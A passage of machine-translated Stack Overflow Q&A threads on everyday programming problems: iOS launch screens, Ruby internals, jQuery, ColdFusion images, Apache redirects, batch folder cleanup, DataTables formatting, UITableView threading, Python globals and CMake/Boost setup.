**注意**：正如 rmaddy 所说，让用户长时间盯着启动屏幕并不是一个好习惯。但是您可以根据客户的需求使用它。

快乐编码。:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:51:28.010

没有默认值——它一直保持到你的程序被加载并从`application:didFinishLaunchingWithOptions:`.

如果您想在程序控制下保持图像，那么您需要手动将其放置在屏幕上作为程序显示的第一件事，然后通过通常的渠道将其关闭。这在 5 之前的 iPhone 上相对容易（只是在里面放一个大`UIImageView`的`Default.png`），但在 iPhone 5 和 iPad 上，你将不得不做出一些关于显示哪个默认屏幕的决定。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-16T08:47:47.700

您也可以尝试在您的`didFinishLaunchingWithOptions`方法中添加睡眠时间，如下所示：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {    

    [NSThread sleepForTimeInterval:3.0f]; //add 3 seconds longer.
   //other code....
} 
```

# ruby - MRI Internals：rb_id2str的详细解释

> ID：13280806
> 
> 赞同：7
> 
> 时间：2012-11-08T00:47:29.140
> 
> 标签：ruby

在 MRI 中，它似乎`rb_id2str()`负责在您调用时完成所有工作`Symbol#to_s`。我惊讶地发现这是一个非常神秘的功能，因为我认为这是一个相当简单的操作。

我正在寻找有关此功能正在做什么的详细说明。作为参考，这里是 1.9.3 中源代码的链接：

[http://rxr.whitequark.org/mri/source/parse.y?v=1.9.3-p195#9950](http://rxr.whitequark.org/mri/source/parse.y?v=1.9.3-p195#9950)

一些具体问题：

四大`if`板块在做什么？

1.  `if (id < tLAST_TOKEN)`
2.  `if (id < INT_MAX && rb_ispunct((int)id))`
3.  `if (st_lookup(global_symbols.id_str, id, &data))`
4.  `if (is_attrset_id(id))`

对 if 语句中每个代码块的作用有一个通用的概述会很棒，但它不需要逐行分析。

最后，我很好奇内存/垃圾收集的含义`to_s`：调用是否会`Symbol#to_s`创建一个每次都必须进行垃圾收集的新字符串，或者是否有类似内部写时复制优化的东西，它使用对实习表示的引用直到对字符串进行突变之前的符号？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-15T11:06:01.910

一方面，我很确定 Symbol#to_s 创建了一个新字符串。大多数 ruby​​ 类都是 C 结构，除了 TrueClass、FalseClass、NilClass、Fixnum 和 Symbol，它们在 C 中是 int。所以 Symbol 与 String 完全不同（这就是为什么推荐使用 Symbol，除非你需要大量更改值） .

我不确定你是否知道《Ruby Hacking Guide》这本书，它解释了很多关于 MRI 如何在 C 中实现的内容。

仅供参考，Ruby Hacking Guide 是用日文写的，到现在还只有一小部分被翻译了，看来大家已经放弃了。[http://rhg.rubyforge.org/](http://rhg.rubyforge.org/)

# javascript - 根据之前的分数实现投票逻辑

> ID：13280807
> 
> 赞同：0
> 
> 时间：2012-11-08T00:47:31.993
> 
> 标签：javascript, jquery

想知道如何处理这个问题。我以前做过，但它涉及很多 if/else 语句，如果不诉诸于此，我似乎无法弄清楚。我在 codereview 上发布了它，并请人帮我重新考虑它，但现在我正试图让这个功能正常工作。

现在的工作原理是，如果您单击“向上”，它将增加 1 分。如果您再次单击“向上”，它会降低分数。没关系。如果您单击“向下”，它将具有相同的行为。但是它永远不会低于 0，因为我不想显示负分。

现在我只是检查上一个或下一个按钮上是否有`.upColor`和`.downColor`css 类，检查他们是否已经投票。我在尝试基于此更新正确分数时遇到问题，尤其是在原始分数为 0 或分数为 10 的情况下。

我试图实现的逻辑：

例如，原始分数为 0：

*   用户投票。得分为 1。用户投反对票。分数变为 0（不是 -1）
*   用户投反对票。分数保持在 0。用户投票赞成。分数变为 1。

例如，原始分数为 10：

*   用户投票。得分为 11。用户投反对票。分数达到 9。
*   用户投反对票。得分为 9。用户投票。分数达到 11。

代码：

```
$(function() {

var handleClick = function($btn) {
    var $voteContainer = $btn.parent();
    var scoreNode = $('.count');
    var originalScore = Number($voteContainer.data('original-score'));

    if ($btn.hasClass('down')) {
        if ($btn.prevAll('.up').hasClass('upColor')) {
            $btn.prevAll('.up').toggleClass('upColor');
            alert('voted up now voting down, decrease 2 points, but don\'t go below 0.');
        }
    }

    if ($btn.hasClass('up')) {
        if ($btn.nextAll('.down').hasClass('downColor')) {
            $btn.nextAll('.down').toggleClass('downColor');
            alert('voted down now voting up, increase by 2 points');
        }
    }

    var increment = $btn.hasClass('up') ? 1 : $btn.hasClass('down') && originalScore > 0 ? -1 : 0; // default

    // Only do something if there is an increment
    if (increment) {
        var currentScore = Number(scoreNode.text()) || 0;
        var newScore = currentScore + increment;
        var diff = Math.abs(originalScore - newScore);

        // Can't go more than + or - 1
        if (diff > 1) {
            newScore = originalScore;
        }

        // Set new displayed value
        scoreNode.text(newScore);
    }
    $btn.hasClass('up') ? $btn.toggleClass('upColor') : $btn.toggleClass('downColor');
};

var upBtn = $('.up');
var downBtn = $('.down');

upBtn.add(downBtn).click(function() {
    var $btn = $(this);

    handleClick($btn);
});

}); 
```

演示：http: [//jsfiddle.net/3kCPw/](http://jsfiddle.net/3kCPw/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:30:04.850

我不会重写你的代码，因为它会花费我太长时间，但我会给你一些我从一开始就会使用的代码。

从原始编号开始：

```
var original_vote = 2;
var current_vote = original_vote; 
```

保持这个常数，以备将来参考。然后，当您单击赞成票时，您可以简单地添加 1：

```
current_vote = original_vote + 1; 
```

然后取消选中赞成票将使其：

```
current_vote = original_vote; 
```

然后对反对票做相反的事情。

保留原始数字可确保您不会意外地使选票超出应有的范围。

希望这可以帮助！

# javascript - 如何将多个相互叠加的 IMG 保存为一张图像？

> ID：13280808
> 
> 赞同：1
> 
> 时间：2012-11-08T00:47:49.913
> 
> 标签：javascript, html, coldfusion

我有多个相互叠加的 IMG（位置：绝对；上：0；左：0；），我需要将所有这些层保存为一个实体图像。我怎样才能做到这一点？客户端的后端是 Coldfusion。

多谢你们！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T01:20:25.647

假设您有多个透明的 PNG/GIF 非常容易（我已经在美国地图上使用着色状态完成了此操作）。您主要使用 imageCopy() 和 imagePaste() 以及图像对象。

```
<!--- below assumes 600x400 images --->
<cfquery name="election">
    select state from electionResults where winner='Obama'
</cfquery>

<cfimage source='#expandPath('/imgs/us.png')#" name="usMap">

<cfloop query="election">
    <cfimage source="#expandPath('/imgs/#state#-blue.png')#" name="state">
    <cfset img = imageCopy(state, 1,1,600,400)>
    <cfset imagePaste(usMap,img,1,1)>

</cfloop>

<cfimage action="write" source="#usMap#" destination="#expandPath('/imgs/us-obama.png')#"
    overwrite="yes">

<img src="/imgs/us-obama.png"> 
```

（未经测试编写，但看起来不错）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:50:31.847

如果要使用 JavaScript，则需要使用画布。

*   添加图像：[如何将图像添加到画布](https://stackoverflow.com/questions/6011378/basic-canvas-question-how-to-add-image-to-canvas)
*   保存图像：[将 HTML Canvas 捕获为 gif/jpg/png/pdf？](https://stackoverflow.com/questions/923885/capture-html-canvas-as-gif-jpg-png-pdf)

如果要在后端进行，则需要使用一些图像库，例如[imagecfc](http://www.opensourcecf.com/imagecfc/)

# jquery - JQuery resize() 窗口放大或缩小

> ID：13280809
> 
> 赞同：1
> 
> 时间：2012-11-08T00:47:56.930
> 
> 标签：jquery, responsive-design

我有这个代码，当一个按钮被点击时显示/隐藏一个菜单

```
$('#main-menu ul').slideToggle(); 
```

当浏览器窗口小于 767 px 时菜单被隐藏，所以这个按钮出现，允许它被打开和关闭，除了唯一的问题是当我再次调整窗口大小时，菜单消失了，如果滑动切换已将其设置为不显示。为了解决这个问题，我添加了代码以在浏览器调整大小后显示菜单。当浏览器窗口再次缩小到小于 767 像素时，这会导致新菜单显示，而不是隐藏默认菜单。然后，当缩放小于 767 像素时，我可以再次隐藏菜单，但这会导致菜单在隐藏时闪烁。

我想知道一种方法来检测 resize() 是否在这种情况下按比例放大 r 缩小时我可以 hide() 菜单和放大时我可以显示() 菜单。

```
$('.menu-button').click(function() {
    $('#main-menu ul').slideToggle();
});

    $(window).resize(function(){
                var w = $(window).width();
                if(w > 767 && $('#main-menu ul').is(':hidden')) {
                    $('#main-menu ul').show();
                }
            });

    $(window).resize(function(){
                var w = $(window).width();
                if(w < 767) {
                    $('#main-menu ul').hide();
                }
            }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T00:54:32.453

您需要存储以前的尺寸，并据此决定调整大小是增加还是减少。

```
jQuery(function($) {
    // Cache a reference to $(window), for performance, and get the initial dimensions of the window
    var $window = $(window),
        previousDimensions = {
            width: $window.width(),
            height: $window.height()
        };

    $window.resize(function(e) {
        var newDimensions = {
            width: $window.width(),
            height: $window.height()
        };

        if (newDimensions.width > previousDimensions.width) {
            // scaling up
        } else {
            // scaling down
        }

        // Store the new dimensions
        previousDimensions = newDimensions;
    });
}); 
```

为了在调整浏览器窗口大小并且用户选择显示它时保持菜单可见，您只需要存储一个标志，说明用户选择使其可见：

```
$('.menu-toggle-button').click(function(e) {
    var $menu = $('#main-menu ul');

    if (!$menu.data('keepVisible')) {
        $menu
            .data('keepVisible', true); // Store the user's choice (show the menu)
            .slideDown(); // Show the menu
    } else {
        $menu
            .data('keepVisible', false); // Store the user's choice (hide the menu)
            .slideUp(); // Hide the menu
    }
});

$(window).resize(function() {
    var $menu = $('#main-menu ul');

    if ($(window).width() < 767) {
        // Window is smaller than 767 pixels wide
        if (!$menu.data('keepVisible')) {
            // Hide the menu if it hasn't been kept visible by the user
            $menu.hide();
        }
    } else if ($menu.is(':hidden') || $menu.data('keepVisible')) {
        Window is larger than 767 pixels wide and the menu is invisible OR has been shown manually by the user
        $menu
            .data('keepVisible', false) // Reset the user's choice
            .show(); // Show the menu
    }
); 
```

（请注意，使用这种技术，确定窗口是变大还是变小的代码块是完全不需要的）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T01:10:21.770

Kelvin Mackay 提供的答案是可行的，但对于一些非常简单的事情来说，它是否有点冗长？为什么放大或缩小都很重要，真正关心的问题是一个点，767px，这是唯一的决定性因素，需要做的就是改变可见性。

如果您正在使用响应式 UI 原则，这实际上更多地与处理跨多个设备的布局有关，而不是人们调整浏览器窗口的大小，为什么您甚至需要一个按钮来隐藏/显示菜单。它应该根据屏幕尺寸自动发生。

首先，当页面加载时，您需要确定菜单状态，然后您需要做的就是拥有一个调整大小的处理程序（如果您只是将两者结合起来，为什么还要担心菜单是否已经隐藏）：

```
 $(window).resize(function(){
            var w = $(window).width();
            if(w > 767) {
                $('#main-menu ul').show();
            }
            else {
                $('#main-menu ul').hide();
            }
        }); 
```

编辑：这个答案已经很久了，如果你现在要这样做，你应该在里面做这种事情`requestAnimationFrame`。

# apache - 将 http://example.com 重定向到 http://www.example.com，同时保持 http://subdomain.example.com 访问不变

> ID：13280811
> 
> 赞同：0
> 
> 时间：2012-11-08T00:48:43.430
> 
> 标签：apache, mod-rewrite, url-rewriting, httpd.conf

我有一个启用子域访问的网站，例如：

```
 http://subdomain1.example.com 
```

它访问相同的代码，但传递一个域参数以显示不同的微型站点。它的 httpd.conf 代码如下所示：

```
 RewriteCond %{HTTP_HOST} ^([^./]+)\.example\.com$
 RewriteRule forums.html$ /browse.php?type=forums&domain=%1 [QSA] 
```

现在我需要将[http://example.com](http://example.com)重定向到[http://www.example.com](http://www.example.com)

我试过这个，但没有奏效：

```
 RewriteCond %{HTTP_HOST} ^example\.com
   RewriteRule ^(.*)$ http://www.example.com/$1 [R=301,L] 
```

（来源：[http](http://www.cyberciti.biz/faq/apache-redirect-domaincom-to-wwwdomaincom/) ://www.cyberciti.biz/faq/apache-redirect-domaincom-to-wwwdomaincom/ ）

编辑1

```
<VirtualHost IPADDRESS:80>
    ServerAlias *.example.com
    DocumentRoot /var/www/html/abc
    ServerName www.example.com
    UseCanonicalName On 
```

编辑2

嗨，mreithub，

我需要的设置是这样的：

[http://X1.example.com](http://X1.example.com)应该使用 /something/X1 中的代码

[http://X2.example.com](http://X2.example.com)应该使用 /something/X2 中的代码

[http://example.com](http://example.com)应该重定向到[http://www.example.com](http://www.example.com)

[http://www.example.com/scriptA.php](http://www.example.com/scriptA.php)应该使用 /var/www/html/abc/scriptA.php 中的代码

[http://whateverelse.example.com/scriptA.php](http://whateverelse.example.com/scriptA.php)应该使用 /var/www/html/abc/scriptA.php 中的代码，但使用 'domain=whateverelse' 参数传递（但屏幕上的 URL 应始终显示将域显示为[http://whateverelse.example.com](http://whateverelse.example.com)）

我曾在 SF 上问过一个问题 - [https://serverfault.com/questions/408805/configuring-httpd-conf-to-handle-wildcard-domains-with-multiple-scripts](https://serverfault.com/questions/408805/configuring-httpd-conf-to-handle-wildcard-domains-with-multiple-scripts) - 从那里我使用了适配器的技术来传递域PHP 脚本的参数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T04:29:22.267

哇。3 小时后……很多变化，很多学习。

1）改变了这个：

```
 NameVirtualHost IPADDRESS:80 
```

至：

```
 NameVirtualHost *:80 
```

2) 全部标记：

```
 <VirtualHost IPADDRESS:80> 
```

作为：

```
 <VirtualHost *:80> 
```

3）重新排列 ServerName 并将其放在 VirtualHost 中（不确定这是否有任何区别）

```
<VirtualHost *:80>
    ServerName test4.example.com
    ServerAlias test4.example.com
    DocumentRoot /home/test4/public_html
    UseCanonicalName On
</VirtualHost> 
```

3) 重新排列所有虚拟主机。将“静态”/固定子域放在前面，将包罗万象的/www 放在最后一个。最后一个看起来像：

```
<VirtualHost *:80>
    ServerName www.example.com
    ServerAlias example.com *.example.com
    DocumentRoot /var/www/html/abc
    UseCanonicalName On
    ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:55:42.953

My personal favorite for redirecting whole VirtualHosts in apache is to simply create a VirtualHost for the domain to redirect and use the `Redirect` directive:

```
<VirtualHost IPADDRESS:80>
  ServerName example.com
  Redirect / http://www.example.com/
  DocumentRoot /var/www # <-- Just for completeness
</VirtualHost> 
```

... and then another VirtualHost for your actual website

`Redirect` redirects every request going to host a to b while keeping any postfixes (e.g. `http://example.com/foo?bar=bak` becomes `http://www.example.com/foo?bar=bak`).

I use `Redirect` a lot to rewrite from http:// to https://

# javascript - 表中的 Javascript 输出

> ID：13280813
> 
> 赞同：1
> 
> 时间：2012-11-08T00:48:47.570
> 
> 标签：javascript

上次我有一个朋友帮我解决了我的问题，现在我遇到了另一个关于 Javascript 的问题。您会看到我正在运行的脚本将在页面加载后发生，如果这个问题已经得到回答，我很抱歉，但基本上我有一个表格，并且在表格的每个单元格中，它都包含一些 Javascript获取一些数据对其进行处理并返回“实时”或“离线”。问题是此时页面已经加载，如果我使用`document.write`它会覆盖整个页面。我不想要那个；我只是希望世界“实时”或“离线”在调用该函数的单元格中，我不知道该怎么做。

为了更清楚一点，我有一个表格，让我们在单元格 (1,1) 中说。我调用一个函数 x 和内部函数 x ，我得到一个结果。我想在单元格 (1,1) 中打印结果并将结果仅保留在单元格 (1,1) 中。页面已经加载后，如何使用 Javascript 执行此操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:02:02.133

假设您的表有一个 id “tableId”。您可以通过以下方式访问 cell(i,j)：

```
var myTable=document.getElementById("tableId");
// an example: first row, second column
var i=0, j=1;
myTable.rows[i].cells[j].innerHTML= "live"; 
```

请注意，索引从 0 开始。

# batch-file - CMD 批量删除文件夹

> ID：13280815
> 
> 赞同：-1
> 
> 时间：2012-11-08T00:49:09.517
> 
> 标签：batch-file, cmd

请帮忙批量写：

在磁盘 c:\ 我有一个名为 test 的文件夹；在这个文件夹中，我有不同名称的子文件夹。我需要批处理命令来遍历所有子文件夹，并查找名为“Log”和/或“sqlite.sql”的文件；如果这些文件大小 < 0 Kb 或不存在，则在不提示的情况下删除该子文件夹以及所有文件。

```
for each sub in Test
 if Isfile("Log") or Isfile("sqlite.sql") and EachFileSizes > 0 Then 
 Else
 Sub.delete
 End If
next 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T08:15:56.960

此问题的解决方案取决于子文件夹的位置。如果它们都直接在 C:\test 下（只有一层深），那么这就是解决方案：

```
@echo off
setlocal EnableDelayedExpansion
cd C:\test
rem Process all subfolders
for /D %%a in (*) do (
   rem Initially, set to delete this subfolder
   set delete=yes
   rem Confirm that
   for %%b in (%%a\Log %%a\sqlite.sql) do (
      set size=%%~Zb
      if !size! gtr 0 set delete=no
   )
   if !delete! equ yes (
      ECHO rd /S /Q %%a
   )
) 
```

如果子文件夹可能存在于 C:\test 下面的几个级别，则解决方案要复杂*得多*。

# javascript - 数据表列中的逗号和 $

> ID：13280817
> 
> 赞同：5
> 
> 时间：2012-11-08T00:49:15.490
> 
> 标签：javascript, jquery, csv, datatables, currency

我有一个包含 4 列的数据表，其中包含货币。目前我将它们视为普通列并手动将“$”附加到每个值。现在我需要将列的格式也设置为逗号。有没有插件可以做到这一点？我还想删除手动添加“$”值。我检查了几个网站，但我真的不明白它们是如何工作的。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-08T06:11:33.420

*[更新答案以使用 DataTables 1.9+ 并尊重 rynop 的更好答案。原始答案保留在水平规则下方，但它已经过时且效率低于应有的水平。]*

由于它实际上是您要修改的数据，而不是整个单元格，因此您应该在列定义中使用“render”属性。要生成干净的代码，您可以将实际的修改方法存储在其他地方并调用它：

```
var myTable = $('#mytable').DataTable({
  ...
  "columns": [
    { 
      "data" : "key_of_column",
      "render" : function( data, type, full ) {
        // you could prepend a dollar sign before returning, or do it
        // in the formatNumber method itself
        return formatNumber(data);                          
      }
    }
  ]
  ...
});

// elsewhere... probably more likely in a utility namespace or module
function formatNumber(n) {
  return n.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
} 
```

`formatNumber`使用这个接受的答案中的正则表达式：

[每三位数字添加逗号](https://stackoverflow.com/questions/1990512/add-comma-to-numbers-every-three-digits-using-jquery)

* * *

*[原答案]*

我自己不会为每个单元格添加美元值，这个决定会降低你需要做的事情的复杂性。;-) 在任何电子表格或货币值表中，您只需将货币符号放在标题或第一行中。把它放在标题中会让你的生活更轻松，把它放在第一行实际上会增加你的问题的复杂性。

所以，回到 DataTables 本身，你有多种方法可以给这只猫剥皮，但这里有两种：

1.  Render the whole table without the commas (ie. default DataTables behaviour) but adding a class to those particular cells with the sClass parameter. Then use fnDrawCallback to fire the comma-creating function as described in the above link.

2.  Use only the regex from the above link to modify the cell as data comes in.

Something like this (where 3 is the zero-index column that you're modifying):

```
"aoColumnDefs": [ {
   "aTargets": [3],
   "fnCreatedCell": function (nTd, sData, oData, iRow, iCol) {
     var $currencyCell = $(nTd);
     var commaValue = $currencyCell.text().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
     $currencyCell.text(commaValue);
   }
}] 
```

(`aoColumnDefs` is part of your initialization object passed to `dataTable()`);

If you absolutely MUST add the dollar sign, you would just prepend it in the same function before the `text` function.

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-19T17:32:32.370

I would leverage the 'mRender' method in 'aoColumns'. Its cleaner and probably more efficient than the currently accepted solution.

Example:

```
oTable = $('#mytable').dataTable( {
...
  "aoColumns": [
    { 
      "sTitle": "MyCol With Number",
       "mRender": function( data, type, full ) {
           return formatNumber(data);                                       
       },                                   
... 
```

Where formatNumber is defined as follows:

```
function formatNumber(n) {
    return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
} 
```

Using fnRender also allows you to have complete control over the cell - for example if you want wrap the data with some HTML.

See [http://www.datatables.net/usage/columns#mRender](http://www.datatables.net/usage/columns#mRender) for complete specifications

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-12-10T21:01:17.333

DataTables 1.10 has a new [Number Helper](https://datatables.net/manual/data/renderers#Number-helper) which is used in conjunction with the render option to easily format numbers, like this:

```
{
    data: 'price',
    render: $.fn.dataTable.render.number( ',', '.', 2, '$' )
} 
```

This will display a price value like 1000.006 as "$1,000.01".

# objective-c - UITableViewDataSource 和多线程

> ID：13280820
> 
> 赞同：1
> 
> 时间：2012-11-08T00:49:34.083
> 
> 标签：objective-c, ios, multithreading, cocoa-touch, uitableview

我在其中一个中遇到了超出范围的索引异常，`UITableViews`我*认为*这可能是由于一些多线程问题。这是我认为正在发生的事情：

1.  我有一个`UITableView`，它的数据源是一个常规的`NSMutableArray`.
2.  这`NSMutableArray`是支持我`UITableView`的，每隔几秒钟就会使用 API 响应的内容进行更新。
3.  每次更新后，都会`UITableView`调用 's reloadData 以确保用户看到来自 API 服务器的新数据。
4.  有时会引发索引超出范围异常。

这是我的代码：

```
-(NSMutableArray*) currentBetEvents
{
    return  currentMarketId == nil ? [[BFOpenBetsModel sharedInstance] betEvents] :     filteredBetEvents;
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{    
    NSArray *betEvents = [self currentBetEvents];
    return [betEvents count];
}

-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSArray *betEvents = [self currentBetEvents];
    id obj = [betEvents objectAtIndex:indexPath.section] // this is where it blows up 
```

基本上，我在尝试访问索引为 0 的 betEvents 结构中的对象时遇到异常。

我*相信*正在发生的是：

1.  `reloadData`被称为`UITableView`
2.  `numberOfSectionsInTableView:`被调用，返回值 > 0。
3.  一个胭脂线程到达并清除了`UITableView`的数据源。
4.  `cellForRowAtIndexPath:`被调用并爆炸。

有什么办法可以确保不会发生这种情况？我是否需要开始在数据源上使用一些原始锁以确保在更新表时不会更新它？

* * *

**编辑** 再看一下 currentBetEvents 返回的数据结构是如何被改变的，看起来filteredBets & betEvents 可以通过以下代码被清除：

```
[[NSNotificationCenter defaultCenter] postNotificationName:kUserLoggedOutNotification object:nil]; 
```

每当用户注销时都会发布此通知。每当用户退出应用程序时，我都需要清除 filtersBets 和 betEvents 数组。是否有可能发生以下情况：

1.  `reloadData`被称为`UITableView`
2.  `numberOfSectionsInTableView:`被调用，返回值 > 0。
3.  用户注销会启动通知并清除数据结构。
4.  `cellForRowAtIndexPath:`被调用并爆炸。

* * *

谢谢，

肖恩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T03:21:59.563

绝对听起来像一个线程问题。你可以尝试这样的事情：

```
// view controller
@synchronized([[BFOpenBetsModel sharedInstance] betEvents])
{
    [self.tableView reloadData];
}

…

// data model
@synchronized(_betEvents) // or whatever the instance variable -betEvents returns is
{
    [_betEvents addObject:whatever];
} 
```

# python - Python：我可以在包 __init__ 模块中设置全局变量吗？

> ID：13280822
> 
> 赞同：2
> 
> 时间：2012-11-08T00:50:24.633
> 
> 标签：python, initialization, global-variables, pytables

所以我正在阅读 Alex Martelli 对[其他问题](https://stackoverflow.com/a/2361278/1658908)的回答......

> “我可能想要初始化的一个例子是，在包加载时，我想一劳永逸地读取一堆数据（比如从文件、数据库或网络）——在这种情况下，它会好得多将该读取放入包的**init** .py 中的私有函数中，而不是使用单独的“初始化模块”并从包中的每个真实模块中冗余导入该模块......”

不幸的是，当我尝试这个时：

**foo/__init__.py**

```
import tables as tb
global foo
foo = tb.openFile('foo.h5', etc._)
import bar 
```

**foo/bar/__init__.py**

```
import tables as tb
global bar
bar = foo.createGroup('/', bar)
import MyFunction` 
```

**foo/bar/MyFunction.py**

```
def MyFunction(*of foo and bar*):
   '...' 
```

* * *

```
>>> import foo
>>> OUTPUT= foo.bar.MyFunction.MyFunction(INPUT)
>>> bar = foo.createGroup('/', bar)
NameError: name 'foo' is not defined 
```

如何定义全局变量而不将它们放入函数中（如此处所示[）](https://stackoverflow.com/a/1084996/1658908)？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:08:04.933

全局变量不是全局变量，因为每一位 Python 代码都看到相同的全局变量集。全局性实际上只是“模块范围”；模块中定义的所有变量和函数都已经是全局的，并且尽可能地是全局的。

如果您想在另一个模块的全局变量中查看一个模块中定义的变量，唯一的方法是将第一个模块的名称导入第二个...... IE：

```
# myModule.py
foo = "bar" 
```

```
# yourModule.py
from myModule import foo 
```

# c++ - CMake 没有找到 Boost

> ID：13280823
> 
> 赞同：34
> 
> 时间：2012-11-08T00:50:30.383
> 
> 标签：c++, boost, cmake, cgal

我正在尝试安装 CGAL。[他们在这里](http://www.cgal.org/Manual/latest/doc_html/installation_manual/Chapter_installation_manual.html#Subsection_6.1)描述他们的安装过程非常简单，第 6.1 节。当我运行`cmake-gui`然后单击`configure`时，我得到以下输出：

```
CMake Error at D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:1192 (message):
  Unable to find the requested Boost libraries.

  Boost version: 1.51.0

  Boost include path: D:/program files/boost_1_51

  The following Boost libraries could not be found:

          boost_thread
          boost_system

  No Boost libraries were found.  You may need to set BOOST_LIBRARYDIR to the
  directory containing Boost libraries or BOOST_ROOT to the location of
  Boost.
Call Stack (most recent call first):
  cmake/modules/CGAL_SetupBoost.cmake:6 (find_package)
  cmake/modules/CGAL_SetupDependencies.cmake:85 (include)
  CMakeLists.txt:590 (include) 
```

但我*确实*`BOOST_ROOT`在 CMake 的 GUI 中设置了`D:/program files/boost_1_51`存在的 。它提到的两个库肯定是安装的。这里发生了什么？我需要做什么？

附上运行时的输出`cmake -DBoost_DEBUG=ON`：

```
D:\program files\CGAL-4.1>cmake -DBoost_DEBUG=ON
== Setting paths ==
-- Build CGAL from release in directory CGAL-4.1
-- Packagenames: CGAL-4.1
== Setting paths (DONE) ==

== Generate version files ==
-- CGAL_MAJOR_VERSION=4
-- CGAL_MINOR_VERSION=1
-- CGAL_BUGFIX_VERSION=0
-- CGAL_SONAME_VERSION=10
-- CGAL_SOVERSION     =10.0.0
-- CGAL_REFERENCE_CACHE_DIR=
-- Building shared libraries
-- Targetting Visual Studio 10 Win64
-- Target build enviroment supports auto-linking
-- Using VC10 compiler.
-- Generator uses intermediate configuration directory: $(Configuration)
-- USING CMake version: 2.8.10
-- System: Windows
== Generate version files (DONE) ==

== Set up flags ==
-- Build type: Release
-- USING CXXFLAGS = ' /DWIN32 /D_WINDOWS /W3 /Zm1000 /GR /EHsc -D_CRT_SECURE_NO_
DEPRECATE -D_SCL_SECURE_NO_DEPRECATE -D_CRT_SECURE_NO_WARNINGS -D_SCL_SECURE_NO_
WARNINGS /fp:strict /fp:except- /MD /O2 /Ob2 /D NDEBUG'
-- USING LDFLAGS = ' /STACK:10000000 /machine:x64  /INCREMENTAL:NO'
== Set up flags (DONE) ==

== Detect external libraries ==
-- External libraries supported: GMP;MPFR;ZLIB;OpenGL;LEDA;MPFI;RS;RS3;OpenNL;TA
UCS;Eigen3;BLAS;LAPACK;QGLViewer;ESBTL;Coin3D;NTL;IPE
-- Preconfiguring library: GMP ...
-- GMP has been preconfigured:
--   CGAL_UseGMP-file:
--   GMP include:      D:/program files/CGAL-4.1/auxiliary/gmp/include
--   GMP libraries:    D:/program files/CGAL-4.1/auxiliary/gmp/lib/libgmp-10.lib

--   GMP definitions:
-- USING GMP_VERSION = '5.0.1'
-- Preconfiguring library: MPFR ...
-- MPFR has been preconfigured:
--   CGAL_UseMPFR-file:
--   MPFR include:      D:/program files/CGAL-4.1/auxiliary/gmp/include
--   MPFR libraries:    D:/program files/CGAL-4.1/auxiliary/gmp/lib/libmpfr-4.li
b
--   MPFR definitions:
-- USING MPFR_VERSION = '3.0.0'
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:566 ] _b
oost_TEST_VERSIONS = 1.56.1;1.56.0;1.56;1.55.1;1.55.0;1.55;1.54.1;1.54.0;1.54;1.
53.1;1.53.0;1.53;1.52.1;1.52.0;1.52;1.51.1;1.51.0;1.51;1.50.1;1.50.0;1.50;1.49.1
;1.49.0;1.49;1.48.1;1.48.0;1.48;1.47.1;1.47.0;1.47;1.46.1;1.46.0;1.46;1.45.1;1.4
5.0;1.45;1.44.1;1.44.0;1.44;1.43.1;1.43.0;1.43;1.42.1;1.42.0;1.42;1.41.1;1.41.0;
1.41;1.40.1;1.40.0;1.40;1.39.1;1.39.0;1.39;1.38.1;1.38.0;1.38;1.37.1;1.37.0;1.37
;1.56.0;1.56;1.55.0;1.55;1.54.0;1.54;1.53.0;1.53;1.52.0;1.52;1.51.0;1.51;1.50.0;
1.50;1.49.0;1.49;1.48.0;1.48;1.47.0;1.47;1.46.1;1.46.0;1.46;1.45.0;1.45;1.44.0;1
.44;1.43.0;1.43;1.42.0;1.42;1.41.0;1.41;1.40.0;1.40;1.39.0;1.39;1.38.0;1.38;1.37
.0;1.37;1.36.1;1.36.0;1.36;1.35.1;1.35.0;1.35;1.34.1;1.34.0;1.34;1.33.1;1.33
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:568 ] Bo
ost_USE_MULTITHREADED = TRUE
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:570 ] Bo
ost_USE_STATIC_LIBS = OFF
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:572 ] Bo
ost_USE_STATIC_RUNTIME =
-- [ D:/program files/CMake 2.8/share/cmake-2.8/Modules/FindBoost.cmake:574 ] Bo
ost_ADDITIONAL_VERSIONS = 1.56.1;1.56.0;1.56;1.55.1;1.55.0;1.55;1.54.1;1.54.0;1.
54;1.53.1;1.53.0;1.53;1.52.1;1.52.0;1.52;1.51.1;1.51.0;1.51;1.50.1;1.50.0;1.50;1
.49.1;1.49.0;1.49;1.48.1;1.48.0;1.48;1.47.1;1.47.0;1.47;1.46.1;1.46.0;1.46;1.45.
1;1.45.0;1.45;1.44.1;1.44.0;1.44;1.43.1;1.43.0;1.43;1.42.1;1.42.0;1.42;1.41.1;1.
